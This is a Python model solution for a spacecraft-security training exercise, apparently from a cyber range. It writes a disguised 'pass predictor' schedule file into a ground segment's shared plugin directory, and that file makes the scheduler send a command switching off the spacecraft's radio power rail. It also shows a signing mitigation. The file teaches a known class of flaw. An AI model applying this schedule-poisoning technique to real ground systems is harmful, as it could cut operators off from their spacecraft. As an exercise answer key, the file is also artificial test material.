#!/usr/bin/env python3
"""EX-G01 model solution: command a spacecraft you cannot reach.

You have no radio, no bus access and no operator account. What you have is the ability to write a
file into the ground segment's plugin directory — the position of anyone who authors a mission
tool, compromises one, or gets one installed.

The ground segment ingests schedule files from that same directory. One directory, two trust
levels: a plugin that is only ever supposed to write its output can therefore write a plan, and the
scheduler transmits it over the operator's own link when its time comes.

Nothing on the spacecraft is broken. The EPS demands its token and gets it, the OBC bounds its PUS
8 copy, the frame's checksum is right. Every control the previous three exercises added does its
job while this happens, because none of them was ever about who decided what to send.

Usage:
    python3 exercises/EX-G01-schedule-poisoning/solve.py --dir "$OUT"/gs-plugins
    python3 exercises/EX-G01-schedule-poisoning/solve.py --dir ... --signed   # try the mitigation
"""
import argparse
import json
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange.paths import out_dir                          # noqa: E402
from cuberange.gs.import_policy import signed_plan  # noqa: E402

SERVICE_FUNCTION, SUBTYPE_PERFORM = 8, 1
FUNC_SET_COMM_RAIL = 1

# The plugin's cover story. A pass predictor writing pass windows is exactly what belongs in this
# directory, and the file is named like one.
PLUGIN_FILE = "passpredict.plan.json"


def poison(delay_s: float = 2.0) -> dict:
    """A plan whose one entry switches the COMM rail off.

    PUS 8,1 function 1, rail 0, state 0 - byte for byte the command the operator sends by hand. The
    OBC will execute it, the EPS will authenticate it, and the radio will go quiet. There is
    nothing malformed anywhere in it.
    """
    args = (FUNC_SET_COMM_RAIL.to_bytes(2, "big") + bytes([0])).hex()
    return {"version": 1,
            "entries": [{"due": time.time() + delay_s,
                         "service": SERVICE_FUNCTION, "subtype": SUBTYPE_PERFORM,
                         "args": args,
                         "note": "pass window 1 - AOS"}]}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", type=Path, default=out_dir() / "gs-plugins",
                    help="the ground segment's plugin directory")
    ap.add_argument("--delay", type=float, default=2.0, help="seconds until the entry is due")
    ap.add_argument("--signed", action="store_true",
                    help="attach an operator signature, to see what the mitigation does with it")
    args = ap.parse_args()

    args.dir.mkdir(parents=True, exist_ok=True)
    doc = poison(args.delay)
    raw = signed_plan(doc) if args.signed else json.dumps(doc).encode()
    (args.dir / PLUGIN_FILE).write_bytes(raw)

    print(f"wrote {args.dir / PLUGIN_FILE}")
    print(f"  one entry, due in {args.delay:.0f}s: PUS {SERVICE_FUNCTION},{SUBTYPE_PERFORM} "
          f"function {FUNC_SET_COMM_RAIL} rail OFF")
    print(f"  signed: {args.signed}")
    if args.signed:
        print("  note that a signature is provenance, not authority - see mitigation.md")
    print("nothing else to do. The ground segment will transmit it, from its own console.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
